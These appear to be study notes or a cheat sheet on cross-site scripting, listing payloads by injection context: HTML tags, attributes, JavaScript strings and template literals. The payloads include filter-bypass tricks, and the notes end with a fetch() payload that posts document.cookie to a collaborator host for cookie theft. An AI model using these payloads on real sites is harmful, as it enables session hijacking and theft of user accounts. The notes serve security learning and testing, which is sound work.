
Context



### 1)XSS between html tags


```javascript
<script>alert(document.domain)</script>

<img src=x onerror=alert(1)>

<body onresize=print() onload=this.style.width='100px'/>
```



Custom html element creation if most tags blocked but embed it inside script tag


```js
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```

This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 

Complete payload is

```js
<script>

location = 'https://Hostname/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';

</script>
```


Event handler and href attribute blocked

```js
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>

```

SVG markup allowed

```js
<svg><animatetransform onbegin=alert(1)>
```


### 2)XSS in HTMl tag attributes 



When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tags

```js
"><script>alert(document.domain)</script>
```



More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler



" autofocus onfocus=alert(document.domain) x="    user supplied data was sent inside html element

creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=" to gracefully repair the following markup.



Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script.


```js
<a href="javascript:alert(document.domain)">  
```


user supplied data was sent to href 


XSS in canonical tag

You might encounter websites that encode angle brackets but still allow you to inject attributes. Sometimes, these injections are possible even within tags that don't usually fire events automatically, such as a canonical tag. You can exploit this behavior using access keys and user interaction on Chrome. Access keys allow you to provide keyboard shortcuts that reference a specific element. The accesskey attribute allows you to define a letter that, when pressed in combination with other keys (these vary across different platforms), will cause events to fire



When inside an html tag

'accesskey='x'onclick='alert(1)

This sets the X key as an access key for the whole page. When a user presses the access key, the alert function is called. 



### 3)XSS in Javascript



In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript 

XSS into a JavaScript string with single quote and backslash escaped

</script><img src=1 onerror=alert(document.domain)>   
user supplied data was sent into script 



Breaking out of a JavaScript string

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.



Examples : 

'-alert(document.domain)-'

';alert(document.domain)// 



XSS into a JavaScript string with angle brackets HTML encoded

';alert(1)// 

' to escape out of string, ; to end the current instruction(remember we are inside script tag)

// to terminate rest of part to avoid errors in script otherwise it wont execute



Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.



';alert(document.domain)//           gets converted to:  \';alert(document.domain)// 



\';alert(document.domain)//         which gets converted to: \\';alert(document.domain)// 

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds. 



XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

\';alert(document.domain)//





```js
<script>onerror=alert;throw 1337</script>
```

If semir colons filtered then use {} to create a block of code 

```js
<script>{onerror=alert}throw 1337</script>

<script>throw onerror=alert,'some string',123,'haha'</script>

```


XSS in a JavaScript URL with some characters blocked

&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'

Do that if we have a parameter



 When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.



***When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further. If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters.***


```js
<a href="#" onclick="... var input='controllable data here'; ...">   
```

and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script: 



```js
&apos;-alert(document.domain)-&apos;      
```

we are inside an attribute and quotes are blocked to escape it 



angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

 

HTML encoded 

' = &apos;

" = &quot;

Dont forget semi colons



\http://foo?&apos;-alert(1)-&apos;    we are inside script first part is our website address , &apos; breaks out of string execute alert then close the apostrophe to not cause errors in script or else it wont execute



XSS in javascript template literals



JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the ${...} syntax.



When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the ${...} syntax to embed a JavaScript expression that will be executed when the literal is processed.



${alert(document.domain)}

XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped



&quot; ${alert(1)}                We are already inside script tag

quot to escape quotes and need to use html encodding since quotes escaped, we are still inside template literal so ${alert}  will execute alert 





### Exploiting cross-site scripting to steal cookies



 Stealing cookies is a traditional way to exploit XSS. Most web applications use cookies for session handling. You can exploit cross-site scripting vulnerabilities to send the victim's cookies to your own domain, then manually inject the cookies into the browser and impersonate the victim.



In practice, this approach has some significant limitations:



- The victim might not be logged in.

- Many applications hide their cookies from JavaScript using the HttpOnly flag.

- Sessions might be locked to additional factors like the user's IP address.

- The session might time out before you're able to hijack it.




```js
<script>

fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {

method: 'POST',

mode: 'no-cors',

body:document.cookie

});

</script>
```